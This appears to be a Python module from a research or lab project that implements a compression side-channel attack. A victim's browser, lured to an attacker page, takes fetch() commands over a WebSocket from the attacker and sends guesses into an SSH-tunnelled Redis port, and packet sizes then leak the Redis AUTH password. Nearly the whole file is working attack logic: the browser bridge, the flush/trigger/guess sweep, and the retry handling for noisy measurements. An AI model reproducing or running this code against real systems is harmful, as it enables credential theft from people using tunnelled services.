"""BEAST-model attack: browser-based injection via fetch().

The victim's browser visits an attacker-controlled web page.  JavaScript
on the page opens a WebSocket back to the attacker and executes fetch()
requests to ``http://localhost:6379`` (the SSH-tunnelled Redis port
forward) on command.  Each fetch creates a ``direct-tcpip`` SSH channel
whose data shares the c->s zlib compression context with the victim's
Redis AUTH traffic.

Because ``fetch()`` sends the full HTTP request (headers + body) in one
shot, the attack cannot pre-open the measurement channel before the
secret as the direct variant does.  The per-measurement overhead is
higher (HTTP headers in every guess), but the compression signal is
the same and the repeat-until-confident mechanism handles the extra
noise.
"""

from __future__ import annotations

import asyncio
import base64
import logging
import random
from typing import Any

from attack import (
    CLIENT_BASE,
    LISTEN_PORT,
    _make_noise,
    run_attack as _run_attack,
)


def _c2s_data_only(records: list[dict]) -> int:
    """Sum c->s TCP payload bytes, ignoring small segments.

    Filters to segments > 100 bytes to exclude ``CHANNEL_OPEN`` packets
    (~60-68 bytes) and keep only the ``CHANNEL_DATA`` packet that
    carries the HTTP request + guess body.
    """
    return sum(
        r["tcp_payload_len"] for r in records
        if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > 100
    )

LOG = logging.getLogger("attack_beast")


# ---------------------------------------------------------------------------
# Browser bridge
# ---------------------------------------------------------------------------

class BrowserBridge:
    """Async bridge between the attack logic and the victim's browser.

    The browser connects via WebSocket and executes fetch() commands
    on behalf of the attacker.
    """

    def __init__(self) -> None:
        self._ws: Any = None
        self._pending: dict[int, asyncio.Future] = {}
        self._next_id = 0
        self._ready = asyncio.Event()

    @property
    def connected(self) -> bool:
        return self._ws is not None and not self._ws.closed

    def set_ws(self, ws: Any) -> None:
        self._ws = ws
        self._ready.set()

    def clear_ws(self) -> None:
        self._ws = None
        self._ready.clear()
        for fut in self._pending.values():
            if not fut.done():
                fut.cancel()
        self._pending.clear()

    async def wait_ready(self, timeout: float = 120) -> None:
        await asyncio.wait_for(self._ready.wait(), timeout=timeout)

    async def inject(self, data: bytes) -> None:
        """Tell the browser to POST *data* to the tunnel and wait."""
        if not self.connected:
            raise RuntimeError("browser not connected")
        msg_id = self._next_id
        self._next_id += 1
        fut = asyncio.get_running_loop().create_future()
        self._pending[msg_id] = fut
        await self._ws.send_json({
            "cmd": "fetch",
            "id": msg_id,
            "body": base64.b64encode(data).decode("ascii"),
        })
        try:
            await asyncio.wait_for(fut, timeout=30)
        finally:
            self._pending.pop(msg_id, None)

    def on_message(self, data: dict) -> None:
        cmd = data.get("cmd")
        if cmd == "done":
            msg_id = data.get("id")
            fut = self._pending.get(msg_id)
            if fut and not fut.done():
                fut.set_result(None)
        elif cmd == "ready":
            LOG.info("browser reported ready")


# ---------------------------------------------------------------------------
# Sweep function
# ---------------------------------------------------------------------------

def make_beast_sweep(bridge: BrowserBridge):
    """Return a sweep function that injects data via the browser."""

    async def sweep_fn(
        session, packet_log, prefix, alphabet,
        noise_lengths, settle, flush_bytes,
    ):
        # Random flush from 0x80-0xFF, generated once per round.
        flush_data = bytes(random.choices(range(0x80, 0x100), k=flush_bytes))

        sums: dict[bytes, int] = {c: 0 for c in alphabet}
        per_nl: dict[int, dict[bytes, int]] = {
            nl: {c: 0 for c in alphabet} for nl in noise_lengths
        }

        # Collect all measurements for this round first, then check
        # for outliers.  If any measurement deviates by more than 4
        # padding blocks (32 bytes) from the median, discard the
        # entire round and re-run it.
        while True:
            round_measurements: dict[int, dict[bytes, int]] = {
                nl: {} for nl in noise_lengths
            }
            for noise_len in noise_lengths:
                noise = _make_noise(noise_len)
                for cb in alphabet:
                    # 1. Flush
                    await bridge.inject(flush_data)
                    if settle > 0:
                        await asyncio.sleep(settle)

                    # 2. Trigger secret
                    async with session.post(
                        f"{CLIENT_BASE}/send_secret",
                    ) as r:
                        await r.read()
                    if settle > 0:
                        await asyncio.sleep(settle)

                    # 3. Clear log, send guess, read
                    packet_log.clear()
                    await bridge.inject(prefix + cb + noise)
                    if settle > 0:
                        await asyncio.sleep(settle)
                    round_measurements[noise_len][cb] = \
                        _c2s_data_only(packet_log.snapshot())

            # Outlier check across the entire round.
            all_vals = [
                v for nl_map in round_measurements.values()
                for v in nl_map.values()
            ]
            if not all_vals:
                break
            median = sorted(all_vals)[len(all_vals) // 2]
            outlier = max(all_vals) - min(all_vals) > 32
            if outlier:
                LOG.info("outlier detected: min=%d max=%d median=%d, "
                         "retrying round",
                         min(all_vals), max(all_vals), median)
                flush_data = bytes(
                    random.choices(range(0x80, 0x100), k=flush_bytes),
                )
                continue
            break

        # Accumulate clean round into sums.
        for noise_len in noise_lengths:
            for cb in alphabet:
                val = round_measurements[noise_len][cb]
                sums[cb] += val
                per_nl[noise_len][cb] = val

        return sums, per_nl

    return sweep_fn


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

async def run_attack(
    packet_log,
    bridge: BrowserBridge,
    settle: float = 0.01,
    min_margin: int = 64,
    known_prefix: bytes = b"*3\r\n$4\r\nAUTH\r\n$7\r\ndefault\r\n$",
    **kwargs: Any,
) -> dict[str, Any]:
    """Run the BEAST-model attack using browser injection."""
    return await _run_attack(
        packet_log=packet_log,
        settle=settle,
        min_margin=min_margin,
        known_prefix=known_prefix,
        sweep_fn=make_beast_sweep(bridge),
        adaptive_noise=False,
        **kwargs,
    )
